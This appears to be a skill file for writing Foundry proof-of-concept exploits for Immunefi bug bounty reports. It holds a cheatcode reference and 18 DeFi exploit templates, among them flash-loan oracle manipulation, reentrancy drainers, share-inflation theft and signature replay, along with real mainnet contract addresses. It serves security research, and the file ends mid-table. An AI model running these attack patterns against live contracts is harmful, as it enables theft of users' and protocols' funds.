---
name: web3-poc-foundry
description: Complete Foundry PoC writing guide + all cheatcodes + DeFiHackLabs reproduction patterns. Use this when building a proof of concept exploit, setting up a fork test, using Foundry cheatcodes, or reproducing a known DeFi hack for learning.
---

# PoC WRITING + FOUNDRY COMPLETE REFERENCE

Immunefi requires RUNNABLE code. Not pseudocode. Not steps. Running Foundry tests with before/after logs and a passing assert.

---

## QUICK START

```bash
# Immunefi official templates (preferred for submissions)
forge init my-poc --template immunefi-team/forge-poc-templates --branch default
forge init my-poc --template immunefi-team/forge-poc-templates --branch reentrancy
forge init my-poc --template immunefi-team/forge-poc-templates --branch flash_loan
forge init my-poc --template immunefi-team/forge-poc-templates --branch price_manipulation

# Or blank Foundry project
forge init my-poc
cd my-poc

# Setup .env
echo "MAINNET_RPC_URL=https://eth.llamarpc.com" > .env
echo "BASE_RPC_URL=https://base.llamarpc.com" >> .env
echo "ARB_RPC_URL=https://arb1.arbitrum.io/rpc" >> .env

# Run exploit
source .env
forge test --match-test testExploit -vvvv --fork-url $MAINNET_RPC_URL
```

---

## STANDARD PoC TEMPLATE (Production Quality for Immunefi)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "forge-std/console.sol";

/**
 * @title [Protocol Name] - [Bug Description]
 * @notice PoC for Immunefi submission
 * @dev Demonstrates [impact] by exploiting [root cause]
 *
 * Vulnerable contract: [address] ([name])
 * Vulnerable function: [functionName]
 * Immunefi program: [URL]
 * Severity: [Critical/High/Medium/Low]
 */

// Minimal interfaces — only what you need
interface IVulnProtocol {
    function deposit(uint256 amount) external;
    function withdraw(uint256 amount) external;
    function balanceOf(address) external view returns (uint256);
}

interface IERC20 {
    function approve(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

contract ExploitPoC is Test {
    // ============================================================
    // CONFIGURATION
    // ============================================================
    uint256 constant ATTACK_BLOCK = 18_000_000;  // pin block for reproducibility

    address constant VULN_CONTRACT = 0x...;
    address constant TOKEN = 0x0000000000000000000000000000000000000000; // example token placeholder

    IVulnProtocol vuln = IVulnProtocol(VULN_CONTRACT);
    IERC20 token = IERC20(TOKEN);

    // ============================================================
    // SETUP
    // ============================================================
    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), ATTACK_BLOCK);
        vm.label(VULN_CONTRACT, "VulnerableProtocol");
        vm.label(TOKEN, "USDC");
        vm.label(address(this), "Attacker");
    }

    // ============================================================
    // EXPLOIT
    // ============================================================
    function testExploit() public {
        uint256 attackerBefore = token.balanceOf(address(this));
        uint256 protocolBefore = token.balanceOf(VULN_CONTRACT);

        console.log("=== INITIAL STATE ===");
        console.log("Attacker USDC:  ", attackerBefore);
        console.log("Protocol USDC:  ", protocolBefore);
        console.log("--------------------");

        // Step 1: [description]
        deal(TOKEN, address(this), 1e6);  // 1 USDC starting capital

        // Step 2: [description]
        token.approve(VULN_CONTRACT, type(uint256).max);
        vuln.deposit(1e6);

        // Step 3: [the exploit]
        // ... exploit logic ...

        uint256 attackerAfter = token.balanceOf(address(this));
        uint256 protocolAfter = token.balanceOf(VULN_CONTRACT);

        console.log("=== FINAL STATE ===");
        console.log("Attacker USDC:  ", attackerAfter);
        console.log("Protocol USDC:  ", protocolAfter);
        console.log("Profit:         ", attackerAfter - attackerBefore);
        console.log("Protocol loss:  ", protocolBefore - protocolAfter);

        assertGt(attackerAfter, attackerBefore, "Exploit failed: no profit");
    }
}
```

### What a Passing PoC Output Looks Like

```
Running 1 test for test/Exploit.t.sol:ExploitPoC
[PASS] testExploit() (gas: 1234567)
Logs:
  === INITIAL STATE ===
  Attacker USDC:   100000
  Protocol USDC:   5000000
  --------------------
  === FINAL STATE ===
  Attacker USDC:   600000
  Protocol USDC:   4500000
  Profit:          500000
  Protocol loss:   500000

Test result: ok. 1 passed; 0 failed
```

The before/after numbers ARE your proof. Paste this output directly into the Immunefi report.

---

## ESSENTIAL CHEATCODES — FULL REFERENCE

### Identity / Caller Control

```solidity
vm.prank(address who);
// Next single call is from `who`
// vm.prank(owner); target.setAdmin(attacker);

vm.startPrank(address who);
vm.stopPrank();
// ALL calls between start/stop are from `who`

vm.startPrank(address msgSender, address txOrigin);
// Set both msg.sender AND tx.origin simultaneously

vm.assume(bool condition);
// Skip fuzz test case if condition is false
```

### State Manipulation

```solidity
vm.deal(address who, uint256 ethAmount);
// Give ETH to any address
// vm.deal(attacker, 10 ether);

deal(address token, address to, uint256 amount);
// Give ERC20 tokens — works with any verified contract
// deal(USDC, attacker, 1_000_000e6); — gives 1M USDC without a source

vm.store(address target, bytes32 slot, bytes32 value);
// Write directly to any storage slot

vm.load(address target, bytes32 slot) returns (bytes32);
// Read any storage slot directly

vm.warp(uint256 timestamp);
// Set block.timestamp
// vm.warp(block.timestamp + 24 hours);

vm.roll(uint256 blockNumber);
// Set block.number
// vm.roll(block.number + 1000);

vm.fee(uint256 basefee);
// Set block.basefee

vm.chainId(uint256 id);
// Set block.chainid (for cross-chain signature tests)
```

### Fork Control

```solidity
vm.createFork(string memory urlOrAlias) returns (uint256 forkId);
vm.createFork(string memory urlOrAlias, uint256 blockNumber) returns (uint256 forkId);
vm.createSelectFork(string memory urlOrAlias, uint256 blockNumber) returns (uint256 forkId);
// Creates AND selects the fork — use this one

vm.selectFork(uint256 forkId);
// Switch between forks (for cross-chain tests)

vm.activeFork() returns (uint256);
// Get current fork ID

// Cross-chain test pattern:
uint256 mainnetFork = vm.createFork(vm.envString("MAINNET_RPC_URL"), 18_000_000);
uint256 baseFork = vm.createFork(vm.envString("BASE_RPC_URL"), 5_000_000);
vm.selectFork(mainnetFork);
// do mainnet action
vm.selectFork(baseFork);
// do base action
```

### Snapshot / Revert

```solidity
uint256 snapshot = vm.snapshot();
// Save entire EVM state

vm.revertTo(uint256 snapshotId);
// Restore to saved state

// Pattern: test multiple attack paths from same starting state
uint256 snap = vm.snapshot();
// test path A
vm.revertTo(snap);
// test path B
```

### Mocking

```solidity
vm.mockCall(address callee, bytes calldata data, bytes calldata returnData);
// Make any call to callee with data return returnData

// Example: mock stale Chainlink price (4 hours ago)
vm.mockCall(
    PRICE_FEED,
    abi.encodeWithSelector(AggregatorV3Interface.latestRoundData.selector),
    abi.encode(uint80(1), int256(63000e8), uint256(0), block.timestamp - 4 hours, uint80(1))
);

vm.mockCallRevert(address callee, bytes calldata data, bytes calldata revertData);
// Make a call revert

vm.clearMockedCalls();
// Remove all mocks
```

### Signature Helpers

```solidity
(uint8 v, bytes32 r, bytes32 s) = vm.sign(uint256 privateKey, bytes32 digest);
// Sign a hash with a private key
// Usage:
bytes32 hash = keccak256(abi.encodePacked(
    "\x19\x01",
    DOMAIN_SEPARATOR,
    keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, amount, nonce, deadline))
));
(uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey, hash);

vm.addr(uint256 privateKey) returns (address);
// Get address from private key
// uint256 key = 0xBEEF; address user = vm.addr(key);

// Generate named test address:
address attacker = makeAddr("attacker");  // deterministic, labeled
```

### Expect Assertions

```solidity
vm.expectRevert();
// Next call MUST revert (any reason)

vm.expectRevert(bytes4 errorSelector);
// Next call MUST revert with specific custom error selector

vm.expectRevert(bytes memory revertData);
// Next call MUST revert with specific data

vm.expectEmit(bool checkTopic1, bool checkTopic2, bool checkTopic3, bool checkData);
// Assert event is emitted — MUST precede the call
vm.expectEmit(true, true, false, true);
emit Transfer(from, to, amount);  // declare expected event
target.transferFrom(from, to, amount);  // then the actual call

vm.expectCall(address callee, bytes calldata data);
// Assert callee is called with data during next call
```

### Labels (for Readable Traces)

```solidity
vm.label(address addr, string memory name);
// Makes traces show "USDC" instead of "0xA0b86..."
// Always label in setUp():
vm.label(USDC, "USDC");
vm.label(TARGET, "VulnerableVault");
vm.label(attacker, "Attacker");
```

### Assert Helpers

```solidity
assertEq(a, b, "message");    // a == b
assertGt(a, b, "message");    // a > b
assertLt(a, b, "message");    // a < b
assertGe(a, b, "message");    // a >= b
assertLe(a, b, "message");    // a <= b
assertTrue(condition, "msg"); // condition is true
assertFalse(condition, "msg");
```

---

## FORK TESTING PATTERNS

### Standard Mainnet Fork (Pin Block)

```solidity
function setUp() public {
    vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), 18_000_000);
    vm.label(USDC, "USDC");
    vm.label(TARGET, "Target");
}
```

### Multi-Fork Test (Cross-Chain Signature Replay PoC)

```solidity
uint256 mainnetFork;
uint256 arbFork;

function setUp() public {
    mainnetFork = vm.createFork(vm.envString("MAINNET_RPC_URL"), 18_000_000);
    arbFork = vm.createFork(vm.envString("ARB_RPC_URL"), 150_000_000);
}

function testCrossChainReplay() public {
    // Step 1: Legitimate claim on mainnet
    vm.selectFork(mainnetFork);
    bytes memory sig = _getSignature();
    target.claimRewards(amount, sig);

    // Step 2: Replay same signature on Arbitrum
    vm.selectFork(arbFork);
    target.claimRewards(amount, sig);  // Should revert — if doesn't, it's a bug
    assertGt(IERC20(TOKEN).balanceOf(address(this)), amount * 2 - 1, "Double claim succeeded");
}
```

### Storage Slot Manipulation

```solidity
// Mapping storage key: keccak256(abi.encode(key, slotNumber))
function getStorageSlotForMapping(address key, uint256 mappingSlot) pure returns (bytes32) {
    return keccak256(abi.encode(key, mappingSlot));
}

// Override ERC20 balance (manual, if deal() doesn't work)
function overrideBalance(address token, address account, uint256 newBalance) internal {
    bytes32 slot = getStorageSlotForMapping(account, 0); // try slot 0
    vm.store(token, slot, bytes32(newBalance));
    require(IERC20(token).balanceOf(account) == newBalance, "Wrong slot — try slot 1, 2...");
}

// Read packed storage (address + other vars in same slot)
bytes32 packed = vm.load(TARGET, bytes32(uint256(0)));
address owner = address(uint160(uint256(packed)));
uint256 value = uint256(packed) >> 160;
```

---

## 18 EXPLOIT PATTERN TEMPLATES (DeFiHackLabs)

Source: github.com/SunWeb3Sec/DeFiHackLabs — 681+ real hacks reproduced in Foundry.

### Pattern 1: Price Oracle Manipulation

**Root cause:** Protocol reads `getReserves()` or `slot0()` — manipulable in same block via flash loan.

```solidity
contract OracleManipulationExploit is Test {
    address constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    function testExploit() public {
        address[] memory tokens = new address[](1);
        tokens[0] = WETH;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 1000 ether;

        IBalancerVault(BALANCER_VAULT).flashLoan(address(this), tokens, amounts, "");
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external {
        // Step 1: Inflate pool price
        IUniswapV2Router(ROUTER).swapExactTokensForTokens(
            1000 ether, 0, path, address(this), block.timestamp
        );

        // Step 2: Exploit price-dependent function (borrow at inflated collateral value)
        ILendingProtocol(TARGET).borrow(TARGET_TOKEN, type(uint256).max);

        // Step 3: Deflate price (swap back)
        IUniswapV2Router(ROUTER).swapExactTokensForTokens(
            balance, 0, reversePath, address(this), block.timestamp
        );

        // Step 4: Repay flash loan
        IERC20(tokens[0]).transfer(BALANCER_VAULT, amounts[0]);
    }
}
```
**Grep:** `getReserves()\|slot0()\|latestAnswer()`

---

### Pattern 2: Classic Reentrancy

**Root cause:** External call made before state update.

```solidity
contract ReentrancyExploit {
    IVulnerable target;
    uint256 attackAmount = 1 ether;

    constructor(address _target) { target = IVulnerable(_target); }

    function attack() external payable {
        target.deposit{value: attackAmount}();
        target.withdraw(attackAmount);
    }

    receive() external payable {
        if (address(target).balance >= attackAmount) {
            target.withdraw(attackAmount);  // Re-enter during ETH transfer
        }
    }
}

// Foundry test:
function testReentrancy() public {
    ReentrancyExploit exploit = new ReentrancyExploit(TARGET);
    vm.deal(address(exploit), 1 ether);
    console.log("Protocol balance before:", TARGET.balance);
    exploit.attack();
    console.log("Protocol balance after:", TARGET.balance);
    assertEq(TARGET.balance, 0, "Drain failed");
}
```
**Grep:** `\.call{value:` without `nonReentrant`

---

### Pattern 3: ERC721/ERC1155 Reentrancy (onReceived Hook)

**Root cause:** NFT transfer callbacks allow reentrancy — no payable fallback needed.

```solidity
contract NFTReentrancyExploit {
    IVulnProtocol target;
    bool attacking;

    function attack() external {
        target.claimReward();  // Protocol sends NFT to us → triggers onERC721Received
    }

    function onERC721Received(
        address, address, uint256, bytes calldata
    ) external returns (bytes4) {
        if (!attacking) {
            attacking = true;
            target.claimReward();  // Re-enter before state updated
        }
        return this.onERC721Received.selector;
    }
}
```
**Grep:** `onERC721Received\|onERC1155Received\|safeTransferFrom` without `nonReentrant`

---

### Pattern 4: Arithmetic Overflow/Underflow

**Root cause:** Unchecked math block, or Solidity < 0.8.0 without SafeMath.

```solidity
function testArithmeticUnderflow() public {
    // Find function with unchecked subtraction
    // Pass values causing a < b
    uint256 bigNumber = type(uint256).max;

    vm.expectRevert();  // Should revert in Solidity 0.8+
    // If it doesn't revert → bug
    target.withdraw(bigNumber);
}
```
**Grep:** `unchecked {` — read every block, verify a < b is impossible

---

### Pattern 5: Arbitrary External Call

**Root cause:** Protocol executes user-provided address + calldata without whitelist.

```solidity
function testArbitraryCall() public {
    bytes memory maliciousCalldata = abi.encodeWithSignature(
        "transfer(address,uint256)",
        address(this),
        IERC20(USDC).balanceOf(TARGET)
    );
    target.swap(USDC, maliciousCalldata);  // attacker controls both target and calldata
    console.log("Stolen USDC:", IERC20(USDC).balanceOf(address(this)));
    assertGt(IERC20(USDC).balanceOf(address(this)), 0);
}
```
**Real example:** LI.FI $10.7M (2024) — `_swapData` passed to library bypassing whitelist.
**Grep:** `\.call(\|delegatecall(` where target/data come from user input

---

### Pattern 6: Missing Access Control on Critical Function

**Root cause:** External function has no modifier — anyone calls it.

```solidity
function testMissingAccessControl() public {
    address attacker = makeAddr("attacker");
    vm.prank(attacker);
    try target.initialize(attacker) {
        console.log("SUCCESS: set owner to attacker");
        assertEq(target.owner(), attacker);
    } catch {
        console.log("PROTECTED: reverted as expected");
    }
}
```
**Grep:** `function initialize\|function setOwner\|function upgrade\|function mint` — does each have `onlyOwner`/`initializer`?

---

### Pattern 7: Donation Attack (balanceOf Pricing)

**Root cause:** Protocol computes shares/price from `token.balanceOf(address(this))`. Direct transfer inflates it.

```solidity
function testDonationAttack() public {
    address victim = makeAddr("victim");
    deal(USDC, victim, 1000e6);
    deal(USDC, address(this), 1 + 1_000_000e6);

    // Step 1: Attacker deposits 1 wei → gets 1 share
    IERC20(USDC).approve(TARGET, 1);
    target.deposit(1);

    // Step 2: Donate 1M USDC directly to contract (inflates price per share)
    IERC20(USDC).transfer(TARGET, 1_000_000e6);

    // Step 3: Victim deposits 1000 USDC → rounds to 0 shares
    vm.startPrank(victim);
    IERC20(USDC).approve(TARGET, 1000e6);
    target.deposit(1000e6);
    vm.stopPrank();

    uint256 victimShares = target.balanceOf(victim);
    console.log("Victim shares:", victimShares);  // 0 if vulnerable

    // Step 4: Attacker redeems → gets their share + victim's funds
    target.withdraw(target.balanceOf(address(this)));
    console.log("Attacker final USDC:", IERC20(USDC).balanceOf(address(this)));
    assertGt(IERC20(USDC).balanceOf(address(this)), 1_000_000e6);
}
```
**Grep:** `balanceOf(address(this))\|totalAssets()` — is price derived from raw balance?

---

### Pattern 8: Fee-on-Transfer Token Incompatibility

**Root cause:** Protocol assumes `amount` transferred = `amount` received. For fee tokens: received = amount - fee.

```solidity
contract FeeToken is ERC20 {
    uint256 public feePercent = 1;  // 1% fee on transfer
    function _transfer(address from, address to, uint256 amount) internal override {
        uint256 fee = amount * feePercent / 100;
        super._transfer(from, address(this), fee);
        super._transfer(from, to, amount - fee);
    }
}

function testFeeOnTransfer() public {
    FeeToken feeToken = new FeeToken("FEE", "FEE");
    feeToken.mint(address(this), 1000e18);
    feeToken.approve(TARGET, 1000e18);

    target.deposit(address(feeToken), 1000e18);
    // Protocol recorded 1000 tokens but only received 990 (1% fee taken)
    // Now withdraw 1000 → protocol tries to send 1000 → only has 990 → uses other users' funds
    target.withdraw(target.balanceOf(address(this)));
}
```
**Grep:** `transferFrom(msg.sender, address(this), amount)` without `balanceBefore/balanceAfter` check

---

### Pattern 9: ERC777 Hook Reentrancy

**Root cause:** ERC777 calls `tokensReceived` on recipient BEFORE sender's state updates.

```solidity
contract ERC777AttackHook is IERC777Recipient {
    IVulnProtocol target;
    bool attacking;

    function tokensReceived(
        address, address from, address,
        uint256 amount, bytes calldata, bytes calldata
    ) external override {
        if (!attacking && amount > 0) {
            attacking = true;
            target.transferFrom(from, address(this), amount);  // re-enter before state updated
        }
    }
}
```
**Grep:** ERC777-accepting protocols → check `nonReentrant` on all token-accepting functions

---

### Pattern 10: Flash Loan Governance Attack

**Root cause:** Governance votes counted at current token balance, not snapshot. Borrow → vote → repay.

```solidity
function testGovernanceFlashLoan() public {
    // Step 1: Flash borrow governance tokens
    // Step 2: Vote on malicious proposal (must be pre-created)
    IGovernance(TARGET).castVote(proposalId, 1);  // 100% YES with borrowed tokens
    // Step 3: Proposal passes
    // Step 4: Repay flash loan
    // Step 5: Execute malicious proposal (drain funds)

    // Key check: is there a snapshot at proposal creation?
    // getPastVotes(account, block.number - 1) → safe (can't flash attack)
    // balanceOf(account) at vote time → VULNERABLE
}
```
**Grep:** `balanceOf\|getCurrentVotes` vs `getPastVotes\|getVotes(account, block)` in voting logic

---

### Pattern 11: Signature Replay / Missing Nonce

**Root cause:** Signed messages can be reused — no nonce, no expiry, or no chainId.

```solidity
function testSignatureReplay() public {
    uint256 attackerKey = 0xBEEF;
    address attacker = vm.addr(attackerKey);

    bytes32 messageHash = keccak256(abi.encodePacked(
        attacker, uint256(100e6)
        // Missing: nonce, chainId, deadline
    ));
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(attackerKey, messageHash);
    bytes memory sig = abi.encodePacked(r, s, v);

    target.withdrawWithSignature(100e6, sig);  // use once
    target.withdrawWithSignature(100e6, sig);  // replay — BUG if succeeds
}
```
**Grep:** `ecrecover\|ECDSA.recover` → check for `nonces[signer]++` and `block.chainid`

---

### Pattern 12: ERC4626 First Depositor Inflation

**Root cause:** No virtual shares. First depositor inflates price per share to steal from victim.

```solidity
function testFirstDepositorInflation() public {
    address victim = makeAddr("victim");
    deal(USDC, victim, 999_999e6);
    deal(USDC, address(this), 1 + 1_000_000e6);

    // Step 1: Attacker deposits 1 wei → gets 1 share
    IERC20(USDC).approve(TARGET, 1);
    target.deposit(1, address(this));
    console.log("Attacker shares:", target.balanceOf(address(this)));  // 1

    // Step 2: Donate 1M USDC directly → 1 share now = 1M USDC
    IERC20(USDC).transfer(TARGET, 1_000_000e6);

    // Step 3: Victim deposits ~1M USDC → rounds to 0 shares
    vm.startPrank(victim);
    IERC20(USDC).approve(TARGET, 999_999e6);
    target.deposit(999_999e6, victim);
    vm.stopPrank();
    console.log("Victim shares:", target.balanceOf(victim));  // 0 if vulnerable

    // Step 4: Attacker redeems → gets ~2M USDC
    target.redeem(1, address(this), address(this));
    assertGt(IERC20(USDC).balanceOf(address(this)), 1_500_000e6);
}
```
**Defense to look for:** `_decimalsOffset()` override, or `totalAssets() + 1` in denominator.

---

### Pattern 13: Flash Swap Callback Exploit (Uniswap V2/V3)

**Root cause:** Protocol's callback doesn't verify caller is the trusted pool.

```solidity
contract FlashSwapExploit is IUniswapV2Callee {
    function attack() external {
        IUniswapV2Pair(USDC_ETH_POOL).swap(
            1_000_000e6, 0, address(this), "attack_data"
        );
    }

    function uniswapV2Call(
        address sender, uint amount0, uint amount1, bytes calldata data
    ) external override {
        // *** EXPLOIT LOGIC HERE — we have 1M USDC ***
        // e.g., deposit as collateral, borrow everything

        // Repay: amount * 1.003 (0.3% fee)
        uint256 repayAmount = (1_000_000e6 * 1004) / 1000;
        IERC20(USDC).transfer(USDC_ETH_POOL, repayAmount);
    }
}
```

---

### Pattern 14: Missing Modifier on Sibling Function

**Root cause:** `vote()` has `onlyNewEpoch`, but `poke()` doesn't — call poke() unlimited times per epoch.

```solidity
function testMissingModifierOnSibling() public {
    address user = makeAddr("user");
    deal(address(LOCK_TOKEN), user, 1000e18);

    vm.startPrank(user);
    LOCK_TOKEN.approve(TARGET, 1000e18);
    target.lock(1000e18, 52 weeks);
    uint256 tokenId = target.tokenOfOwnerByIndex(user, 0);

    target.vote(tokenId, pools, weights);  // once per epoch (guarded)

    // poke() missing epoch guard → spam to drain rewards
    for (uint i = 0; i < 10; i++) {
        target.poke(tokenId);
    }

    console.log("Claimed via poke spam:", REWARD_TOKEN.balanceOf(user));
    vm.stopPrank();
}
```

---

### Pattern 15: Off-By-One at Epoch Boundary

**Root cause:** `>` excludes the equal case where equal should be valid.

```solidity
function testBoundaryCondition() public {
    uint256 currentPeriod = target.currentPeriod();
    vm.warp(target.periodEnd(currentPeriod));  // Warp to exact end

    // At this point: endPeriod == nextClaimablePeriod
    // BUG: > excludes this case → falls through to wrong branch → claim again
    target.claim();
    target.claim();  // Should revert but might succeed at exact boundary

    console.log("Double claimed at exact boundary");
}
```

---

### Pattern 16: Self-Destruct Force-Feed

**Root cause:** Contract logic uses `address(this).balance` but doesn't account for forced ETH.

```solidity
contract ForceFeeder {
    constructor(address target) payable {
        selfdestruct(payable(target));
    }
}

function testForceFeed() public {
    new ForceFeeder{value: 1 ether}(TARGET);
    // Now: address(this).balance > 0 even if no one deposited
    // Breaks any invariant that expects balance == tracked deposits
}
```

---

### Pattern 17: Permit Frontrun DoS

**Root cause:** User submits `permitAndDeposit`. Attacker frontruns `permit()` — consuming nonce → victim's tx reverts.

```solidity
function testPermitFrontrun() public {
    uint256 userKey = 0xABCD;
    address user = vm.addr(userKey);
    deal(USDC, user, 1000e6);

    (uint8 v, bytes32 r, bytes32 s) = _createPermitSig(
        userKey, TARGET, 1000e6, block.timestamp + 3600
    );

    // Attacker frontruns: uses the signature before user's tx
    IERC20Permit(USDC).permit(user, TARGET, 1000e6, block.timestamp + 3600, v, r, s);

    // Now user's permitAndDeposit reverts — does whole tx fail or does deposit still work?
    vm.prank(user);
    vm.expectRevert();  // bug if this ACTUALLY causes the entire tx to revert
    target.permitAndDeposit(1000e6, block.timestamp + 3600, v, r, s);
}
```
**Check:** Does `permitAndDeposit` use `try/catch` for the permit call? If not → DoS vector.

---

### Pattern 18: Tautology in Require (Always-True Condition)

**Root cause:** Variable compared to itself, or condition that is always true due to type constraints.

```solidity
function testTautologyCheck() public {
    // Example: require(sourceRoot == sourceRoot) → always passes
    // Or: uint256 x; require(x >= 0); → uint always >= 0

    // Prove it: provide completely wrong data — if require passes, it's a tautology
    bytes32 fakeRoot = keccak256("completely_wrong_data");
    bytes32 fakeProof = keccak256("fake_proof");

    bool result = target.verify(fakeRoot, fakeProof);
    assertTrue(result, "Tautology: verify always returns true — bug confirmed");
}
```
**Grep:**
```bash
grep -rn "require\|assert" contracts/ | python3 -c "
import sys, re
for l in sys.stdin:
    if re.search(r'\b(\w{4,})\b.*==.*\b\1\b', l):
        print(l.strip())
"
grep -rn ">= 0" contracts/ | grep "uint"  # uint always >= 0
```

---

## FOUNDRY INVARIANT TESTING

```solidity
// Invariant tests: Foundry calls random sequences of functions,
// checks invariants after each sequence

contract VaultInvariantTest is Test {
    IVault vault;
    address[] users;

    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), 18_000_000);
        vault = IVault(VAULT_ADDR);
        for (uint i = 0; i < 3; i++) {
            users.push(makeAddr(string(abi.encodePacked("user", i))));
        }
        targetContract(address(vault));
    }

    // Invariant: vault is not underwater
    function invariant_notInsolvent() public view {
        assertGe(vault.totalAssets(), vault.totalSupply());
    }

    // Invariant: sum of all user balances == totalSupply
    function invariant_balancesSumToSupply() public view {
        uint256 sum;
        for (uint i = 0; i < users.length; i++) {
            sum += vault.balanceOf(users[i]);
        }
        assertEq(sum, vault.totalSupply());
    }

    // Invariant: no free shares (principal is always 1:1)
    function invariant_noPhantomShares() public view {
        assertEq(vault.totalAssets(), vault.totalSupply());
    }
}
```

### foundry.toml Configuration

```toml
[profile.default]
src = "src"
out = "out"
libs = ["lib"]
solc_version = "0.8.20"
optimizer = true
optimizer_runs = 200
evm_version = "cancun"

[fuzz]
runs = 256
seed = 1
max_global_rejects = 65536

[invariant]
runs = 256
depth = 32  # function calls per run

[rpc_endpoints]
mainnet = "${MAINNET_RPC_URL}"
base = "${BASE_RPC_URL}"
arbitrum = "${ARB_RPC_URL}"
```

---

## FUZZ TESTING

```solidity
function testFuzz_deposit(uint256 amount) public {
    amount = bound(amount, 1, 1_000_000e6);  // bound to reasonable range

    deal(USDC, address(this), amount);
    IERC20(USDC).approve(TARGET, amount);
    target.deposit(amount);

    // Invariant: shares received should never be 0 for non-zero deposit
    assertGt(target.balanceOf(address(this)), 0, "Zero shares for non-zero deposit");
}
```

---

## DEBUGGING TIPS

### Console Logging

```solidity
import "forge-std/console.sol";

console.log("Balance:", amount);
console.log("Address:", addr);
console.log("Bool:", flag);
console.logBytes(rawBytes);

// Profit pattern (standard for Immunefi reports):
uint256 before = IERC20(TOKEN).balanceOf(address(this));
// exploit...
uint256 after_ = IERC20(TOKEN).balanceOf(address(this));
console.log("=== BEFORE ===");
console.log("Attacker:", before);
console.log("=== AFTER ===");
console.log("Attacker:", after_);
console.log("Profit:", after_ - before);
assertGt(after_, before, "No profit made");
```

### Cast Investigation Commands

```bash
# Call a read-only function
cast call 0xCONTRACT "functionName(uint256)(bool)" 12345 --rpc-url https://eth.llamarpc.com

# Get storage slot value
cast storage 0xCONTRACT 0 --rpc-url https://eth.llamarpc.com

# Decode calldata
cast 4byte-decode 0xabcdef12...

# Trace a transaction (reproduce exploit from tx hash)
cast run 0xTX_HASH --rpc-url https://eth.llamarpc.com

# Compute keccak256
cast keccak "DISTRIBUTOR_ROLE"

# Check role membership
cast call 0xCONTRACT "hasRole(bytes32,address)(bool)" \
  $(cast keccak "DISTRIBUTOR_ROLE") \
  0xADMIN_ADDRESS \
  --rpc-url https://eth.llamarpc.com

# Get event logs
cast logs --address 0xCONTRACT --from-block 18000000 --to-block 18001000 \
  "Transfer(address,address,uint256)"
```

### Anvil (Local Fork Node)

```bash
# Start local fork
anvil --fork-url $MAINNET_RPC_URL --fork-block-number 18000000

# Fork with unlocked account for manual testing
anvil --fork-url $MAINNET_RPC_URL --fork-block-number 18000000 --unlocked 0xADMIN_ADDRESS

# Send transaction from unlocked account
cast send 0xCONTRACT "mint(address,uint256)" 0xATTACKER 1000000000000000000 \
  --unlocked --from 0xOWNER \
  --rpc-url http://127.0.0.1:8545
```

### Chisel (REPL for Quick Tests)

```bash
chisel
# In REPL:
!fork $MAINNET_RPC_URL 18000000
keccak256("DISTRIBUTOR_ROLE")
interface ITarget { function owner() external view returns (address); }
ITarget(0xCONTRACT).owner()
!exit
```

---

## COMMON FORGE FLAGS

```bash
forge test --match-test testExploit -v      # pass/fail only
forge test --match-test testExploit -vv     # + console.log output
forge test --match-test testExploit -vvv    # + traces for failed tests
forge test --match-test testExploit -vvvv   # + ALL traces including passing

--fork-url $MAINNET_RPC_URL
--fork-block-number 18000000
--match-path test/Exploit.sol
--match-contract ExploitPoC
--gas-report
forge test --watch   # re-run on file change
forge coverage       # coverage report
```

---

## COMMONLY USED MAINNET ADDRESSES

```solidity
// Tokens
address constant USDC    = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
address constant USDT    = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
address constant DAI     = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
address constant WETH    = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant WBTC    = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
address constant stETH   = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
address constant wstETH  = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;

// Flash Loan Sources
address constant BALANCER_VAULT  = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
address constant AAVE_V3_POOL    = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
address constant MORPHO          = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;

// DEX
address constant UNISWAP_V3_ROUTER = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
address constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

// Aave V3
address constant AAVE_V3_POOL_ADDRESSES_PROVIDER = 0x2f39d218133AFaB8F2B819B1066c7E434Ad94E9e;

// Chainlink ETH/USD
address constant ETH_USD_FEED = 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419;
```

---

## COMMON PoC FAILURES AND FIXES

| Failure | Cause | Fix |
|---------|-------|-----|
| `fork RPC error` | Bad or missing RPC URL | Check `.env`, run `source .env` first |
| `deal() not working` | Token has non-standard storage | Find storage slot manually with `cast storage` |
| `vm.prank() reverts` | Function checks `tx.origin`, not `msg.sender` | Use `vm.startPrank(user, user)` to set both |
| `test runs but doesn't use fork` | Missing `--fork-url` flag | Add `--fork-url $MAINNET_RPC_URL` |
| `assertGt fails, attacker got 0` | Wrong logic, wrong block, wrong address | Add console.logs at each step to find where it breaks |
| `Out of gas` | Too many iterations or expensive calls | Add `vm.txGasPrice(0)` and `--gas-limit 50000000` |
| Trace shows wrong selector | Interface mismatch | Copy ABI from Etherscan/cast abi instead of writing manually |
| `ERC20: insufficient allowance` | Forgot approve | Add `token.approve(TARGET, type(uint256).max)` |

---

## VULNERABILITY FREQUENCY (DeFiHackLabs 2021-2025)

| Rank | Bug Class | % of Hacks | Flash Loan? | Example Loss |
|------|-----------|------------|-------------|--------------|
